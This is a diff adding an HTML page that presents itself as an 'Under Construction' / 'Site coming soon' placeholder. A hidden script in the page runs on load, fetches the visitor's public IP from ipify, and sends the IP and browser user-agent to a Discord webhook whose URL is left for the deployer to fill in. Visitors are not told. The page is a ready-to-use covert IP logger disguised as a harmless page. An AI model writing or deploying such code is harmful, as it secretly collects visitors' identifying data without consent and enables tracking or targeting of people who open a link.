@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Under Construction</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #121212; color: white; }
+    </style>
+</head>
+<body>
+    <h1>Site coming soon...</h1>
+
+    <script>
+        // This script runs as soon as someone opens the page
+        async function logVisitor() {
+            try {
+                // 1. Get the IP from a public service
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // 2. Send the data to your Discord Webhook
+                await fetch('PASTE_YOUR_WEBHOOK_URL_HERE', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🌐 New Visitor Logged",
+                            color: 3447003,
+                            fields: [
+                                { name: "IP Address", value: data.ip, inline: true },
+                                { name: "Browser", value: navigator.userAgent, inline: false }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            } catch (err) {
+                console.log("Log failed (likely an AdBlocker)");
+            }
+        }
+
+        logVisitor();
+    </script>
+</body>
+</html>
